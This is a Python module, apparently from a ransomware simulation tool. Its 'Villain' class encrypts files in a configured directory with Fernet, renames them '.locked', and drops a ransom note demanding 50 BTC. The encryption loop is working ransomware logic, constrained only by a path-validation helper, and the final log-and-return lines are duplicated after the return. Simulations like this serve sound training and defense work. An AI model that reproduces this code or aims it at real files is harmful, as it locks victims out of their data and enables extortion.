import os
from cryptography.fernet import Fernet
from pathlib import Path
from .safety import SafetyEnforcer
from .analyst import Analyst
from .config import Config
import time

class Villain:
    """
    The Villain simulates a ransomware attack.
    It uses AES encryption (via Fernet) to lock files, mimicking real-world crypto-lockers.
    """
    
    @staticmethod
    def generate_key():
        """Generates and saves a key if it doesn't exist."""
        if not Config.KEY_FILE.exists():
            key = Fernet.generate_key()
            with open(Config.KEY_FILE, "wb") as key_file:
                key_file.write(key)

    @staticmethod
    def load_key():
        """Loads the encryption key."""
        if not Config.KEY_FILE.exists():
            Villain.generate_key()
        return open(Config.KEY_FILE, "rb").read()

    @staticmethod
    def infect_system(progress_callback=None):
        """
        Encrypts files in the production directory.
        Returns tuple: (encrypted_count, incident_id)
        """
        SafetyEnforcer.ensure_directories()
        
        # Generate a unique Incident ID for this attack
        incident_id = f"INC-{int(time.time())}"
        Analyst.log_event("Attack Start", incident_id=incident_id)
        
        key = Villain.load_key()
        fernet = Fernet(key)
        
        target_dir = Config.PRODUCTION_DIR
        encrypted_count = 0
        
        # Drop Ransom Note
        ransom_note_path = target_dir / Config.RANSOM_NOTE_FILE
        with open(ransom_note_path, "w") as f:
            f.write(f"""
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!
Incident ID: {incident_id}

All your documents, photos, and databases have been locked with military-grade encryption.
There is NO WAY to restore them without our special key.

To purchase the decryption key:
1. Send 50 BTC to the following wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
2. Email us at ransomware@darkweb.local with your Incident ID.

Time is ticking. If you do not pay within 24 hours, your data will be lost forever.
            """)
        
        # Walk through the directory
        files_to_encrypt = []
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                file_path = Path(root) / file
                if SafetyEnforcer.validate_path(file_path):
                     if file == Config.RANSOM_NOTE_FILE or file.endswith('.locked'):
                        continue
                     if file.endswith(Config.TARGET_EXTENSIONS):
                         files_to_encrypt.append(file_path)

        total_files = len(files_to_encrypt)
        
        for i, file_path in enumerate(files_to_encrypt):
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                
                encrypted_data = fernet.encrypt(data)
                
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                    
                # Rename file
                new_path = file_path.with_suffix(file_path.suffix + ".locked")
                os.rename(file_path, new_path)
                encrypted_count += 1
                
                # Update progress if callback provided
                if progress_callback:
                    progress_callback((i + 1) / total_files)
                
                # Artificial delay for dramatic effect (optional, keep small)
                time.sleep(0.05) 
                
            except Exception as e:
                print(f"Failed to encrypt {file_path.name}: {e}")
        
        Analyst.log_event("Encryption Complete", {"files_encrypted": encrypted_count}, incident_id=incident_id)
        return encrypted_count, incident_id
        
        Analyst.log_event("Encryption Complete", {"files_encrypted": encrypted_count}, incident_id=incident_id)
        return encrypted_count, incident_id
